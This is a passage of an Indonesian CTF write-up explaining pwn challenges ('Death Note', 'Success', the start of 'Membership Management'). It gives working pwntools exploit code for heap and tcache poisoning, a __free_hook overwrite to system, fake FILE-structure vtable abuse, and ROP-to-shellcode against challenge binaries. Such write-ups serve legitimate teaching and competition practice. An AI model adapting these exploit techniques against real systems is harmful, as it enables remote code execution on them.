<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">openat</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sh">'</span><span class="s">/home/ctf/flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mh">0xC8</span><span class="p">,</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

<span class="c1"># pwndbg&gt; dq 0x5555557580f0-0x10
# 00005555557580e0     0000000000000001 00000000000000d1
# 00005555557580f0     2434810101757968 2f66b84801010101
#                                    ^^ our shellcode start here
# 0000555555758100     4850742e67616c66 632f656d6f682fb8
# 0000555555758110     31ff31e689485074 0f0101b866c031d2
</span>
<span class="c1"># pwndbg&gt; p/x 0x5555557580f0-0x555555757260
# $2 = 0xe90
</span>
<span class="n">shellcode_start</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0xE90</span>
</code></pre></div></div>

<p>Write ROP-chain untuk ubah permission heap menjadi executable dan return ke shellcode.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stack_rip</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0xD8</span>

<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">mprotect</span><span class="sh">'</span><span class="p">],</span> <span class="p">[</span><span class="n">heap</span> <span class="o">-</span> <span class="mh">0x260</span><span class="p">,</span> <span class="mh">0x21000</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">])</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">shellcode_start</span><span class="p">)</span>

<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
    <span class="nf">kill</span><span class="p">(</span><span class="n">stack_rip</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="p">:</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])</span>
</code></pre></div></div>

<p>Exit untuk trigger ROP dan return ke shellcode. Sekarang heap memory memiliki permission executable dan shellcode akan tereksekusi.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap heap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555757000     0x555555778000 rwxp    21000 0      <span class="o">[</span>heap]
</code></pre></div></div>

<h3 id="intended-solution">Intended Solution</h3>

<p>Intended Solution dari author adalah overwrite <code class="language-plaintext highlighter-rouge">fastbinY</code> agar menunjuk ke stack. Agar malloc mengembalikan pointer dalam range stack. Malloc ke-N akan me-return alamat stack yang berisi address dari rip. Dan melakukan ROP open-read-write, menggunakan <code class="language-plaintext highlighter-rouge">openat</code>.</p>

<h2 id="death-note-896-pts">Death Note (896 pts)</h2>

<p>Classic heapnote challenge dengan fungsi create, edit, view, delete seperti pada umumnya.</p>

<h3 id="analysist">Analysist</h3>

<p>Create melakukan malloc dengan size dari user dengan constraint, <code class="language-plaintext highlighter-rouge">0 &gt; size &lt; 0x100</code>. Dengan index array mencari yang kosong dan ditentukan oleh sistem. Data array hanya berukuran 10.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">create</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
        <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Enough targets for today!"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">gdata</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Provide note size:"</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0xFF</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Wrong size!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">gdata</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
        <span class="n">gsize</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Note is created at index: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Edit ini melakukan read array yang sudah diallokasikan oleh user dengan constraint index &lt; 9.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">edit</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span>
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>

    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Provide note index: "</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">);</span>
    <span class="n">index</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"The death note isn't that big unfortunately</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">gdata</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Name: "</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">gdata</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">gsize</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Page doesn't even exist!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Delete akan melakukan free ke index dari user yang sudah diallokasikan. Dan pointer akan di-set menjadi NULL (no uaf). View akan mengoutputkan informasi data dari index yang diberikan.</p>

<h3 id="where-is-the-bug">Where is the bug?</h3>

<p>Bugnya secara jelas ada di edit. Karena contraint hanya index &lt; 9 dengan bilangan negatif ini akan lolos. Ini bisa digunakan untuk edit pointer-pointer yang ada diatas <code class="language-plaintext highlighter-rouge">array_data_notes</code>.</p>

<h3 id="exploit-1">Exploit</h3>

<p>Untuk mempermudah interaksi dengan soal,</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Address libc bisa didapatkan dengan memenuhi tcachebins. Free selanjutnya dengan size yang sama akan masuk ke unsortedbins. Chunk ini mempunyai 2 pointer, FD dan BK yang menunjuk ke main_arena yang letaknya di libc.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
    <span class="nf">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>

<span class="c1"># prevent consolidation with top_chunks
</span><span class="nf">create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
    <span class="nf">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># tcachebins
# 0x90 [  7]: 0x555555757620 —▸ 0x555555757590 —▸ 0x555555757500 —▸ 0x555555757470 —▸ 0x5555557573e0 —▸ 0x555555757350 —▸ 0x5555557572c0 ◂— 0x0
</span>
<span class="c1"># unsortedbin
# all: 0x5555557576d0 —▸ 0x155555324ca0 (main_arena+96) ◂— 0x5555557576d0
</span></code></pre></div></div>

<p>Sekarang, hanya allokasikan chunks size &lt; chunk unsortedbins. Maka akan ada pointer main_arena di chunk data yang baru saja dialokasikan.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># pwndbg&gt; dq 0x5555557576a0
# 00005555557576a0     0000000000000000 0000000000000031
# 00005555557576b0     0000155555324d20 0000155555324d20 -&gt; chunks[0]'s data
# 00005555557576c0     0000000000000000 0000000000000000
</span>
<span class="n">leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">view</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3ebd20</span>

<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Kondisi tcachebins, array_data_notes dan chunk diatasnya pada heap sekarang,</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x30</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mh">0x5555557576b0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
<span class="mh">0x90</span> <span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mh">0x555555757620</span> <span class="err">—▸</span> <span class="mh">0x555555757590</span> <span class="err">—▸</span> <span class="mh">0x555555757500</span> <span class="err">—▸</span> <span class="mh">0x555555757470</span> <span class="err">—▸</span> <span class="mh">0x5555557573e0</span> <span class="err">—▸</span> <span class="mh">0x555555757350</span> <span class="err">—▸</span> <span class="mh">0x5555557572c0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
<span class="o">---</span>
<span class="mh">0x555555757000</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000251</span>
<span class="mh">0x555555757010</span>	<span class="mh">0x0700000000000100</span>	<span class="mh">0x0000000000000000</span>
<span class="bp">...</span>
<span class="mh">0x555555757050</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x00005555557576b0</span>
<span class="bp">...</span>
<span class="mh">0x555555757080</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000555555757620</span>
<span class="bp">...</span>
<span class="mh">0x555555757250</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000061</span>
<span class="mh">0x555555757260</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span> <span class="o">--&gt;</span> <span class="n">array_data_notes</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>
<span class="mh">0x555555757270</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
<span class="mh">0x555555757280</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
<span class="mh">0x555555757290</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
<span class="mh">0x5555557572a0</span>	<span class="mh">0x0000555555757740</span>	<span class="mh">0x0000000000000000</span>
<span class="mh">0x5555557572b0</span>	<span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>Pada alamat <code class="language-plaintext highlighter-rouge">0x555555757088</code>, berisi <code class="language-plaintext highlighter-rouge">0x555555757620</code>, yang mana ini merupakan salah satu FD pointer chunk yang ada di tcachebins diatas.</p>

<p>Karena terdapat index out-of-bound (negative number) pada fungsi edit, kita bisa melakukan tcache-poisoning dengan mengedit alamat tersebut untuk menunjuk ke <code class="language-plaintext highlighter-rouge">__free_hook</code>. Lalu overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> menjadi system.</p>

<p>Trigger dengan melakukan free ke chunk yang menyimpan string /bin/sh untuk mendapatkan RCE.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># pwndbg&gt; p (0x555555757088-0x555555757260)/8
# $2 = -59
</span>
<span class="nf">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">59</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">]))</span>

<span class="nf">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="p">;</span> <span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\0</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="p">;</span> <span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]))</span>

<span class="c1"># pwndbg&gt; tel &amp;__free_hook 1
# 00:0000│   0x1555553268e8 (__free_hook) —▸ 0x155554f884e0 (system) ◂— test   rdi, rdi
</span>
<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="success-957-pts">Success (957 pts)</h2>

<p>Pada dasarnya challange ini berdasarkan File Structure Exploit - GLIBC 2.27. Goal-nya adalah untuk bypass <code class="language-plaintext highlighter-rouge">_IO_vtable_check</code> yang terdapat pada libc versi 2.24 keatas.</p>

<h3 id="infomation-leaks">Infomation Leaks</h3>

<p>Didapatkan pada fungsi get_name, karena menggunakan read yang tidak mengakhiri buffernya dengan nullbyte. Dengan ini, bisa membocorkan nilai-nilai yang ada distack.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Please provide student username: </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">)</span>
<span class="n">pie</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">][</span><span class="mi">8</span><span class="p">:])</span> <span class="o">-</span> <span class="mh">0x1090</span>

<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Please provide student username: </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">][</span><span class="mh">0x10</span><span class="p">:])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_file_jumps</span><span class="sh">'</span><span class="p">]</span>
</code></pre></div></div>

<p>Bug nya ada di fungsi fill_data. Out-of-bound di .bss, karena array datas hanya berukuran 64, tetapi input number bisa sampai 64, ini akan meng-overwrite file pointer numbers2.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">number</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">"Provide number of subjects: "</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">number</span> <span class="o">&gt;</span> <span class="mi">64</span> <span class="o">||</span> <span class="n">number</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">number</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">get_float</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
    <span class="n">datas</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">_mm_cvtsi128_si32</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/**
 * .bss:0000000000202060 ; _DWORD datas[64]
 * .bss:0000000000202160 ; FILE *numbers2
 **/</span>
</code></pre></div></div>

<h3 id="crafting-fake-file-structure">Crafting Fake File Structure</h3>

<p>Bisa dengan mudah karena pwntools sudah menyediakan :smile:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">).</span><span class="nf">__next__</span><span class="p">()</span>
<span class="n">fake_vtable</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_file_jumps</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">8</span>

<span class="n">fake_struct</span> <span class="o">=</span> <span class="nc">FileStructure</span><span class="p">()</span>
<span class="n">fake_struct</span><span class="p">.</span><span class="n">_IO_buf_base</span>   <span class="o">=</span> <span class="mi">0</span>
<span class="n">fake_struct</span><span class="p">.</span><span class="n">_IO_buf_end</span>    <span class="o">=</span> <span class="p">(</span><span class="n">rdi</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
<span class="n">fake_struct</span><span class="p">.</span><span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="p">(</span><span class="n">rdi</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
<span class="n">fake_struct</span><span class="p">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">fake_struct</span><span class="p">.</span><span class="n">_lock</span>          <span class="o">=</span> <span class="n">pie</span> <span class="o">+</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">ch</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x80</span>
<span class="n">fake_struct</span><span class="p">.</span><span class="n">vtable</span>         <span class="o">=</span> <span class="n">fake_vtable</span>
</code></pre></div></div>

<p>Karena terdapat space array datas[64], ini merupakan target yang bagus untuk menaruh fake_file_struct yang dibuat. Tantangannya adalah menulis dalam bentuk float. Berikut helper untuk konversi ke float,</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">toFloat</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;f</span><span class="sh">"</span><span class="p">,</span> <span class="nf">p32</span><span class="p">(</span><span class="n">value</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="exploit-2">Exploit</h3>

<p>Writing time, wwww.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">fake_struct</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">])</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
    <span class="n">target</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">toFloat</span><span class="p">(</span><span class="n">target</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">toFloat</span><span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># padding
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">toFloat</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># overwrite file_stream_ptr numbers2 to our fake_file_struct.
</span><span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">toFloat</span><span class="p">((</span><span class="n">pie</span> <span class="o">+</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">ch</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Fungsi <code class="language-plaintext highlighter-rouge">fclose</code> akan men-trigger fake_file_struct kita dan RCE didapatkan.</p>

<h2 id="membership-management-988-pts">Membership Management (988 pts)</h2>

<p>Heap exploitation challange GLIBC 2.31. Dengan fitur create, delete, edit dan tanpa view. Yaa, inti tantangan problem ini adalah tidak ada fungsi view, yang dapat mempermudah untuk mendapat leak.</p>

<h3 id="analysist-1">Analysist</h3>

<p>Subscribe, akan melakukan malloc sebesar 0x50. Pointer heap dari malloc ini ditampung di variable global array yang memiliki size 52. Dan melakukan inisiasi is_active pada index array yang dipakai menjadi 1. Ini menandakan chunk dalam kondisi terpakai.</p>

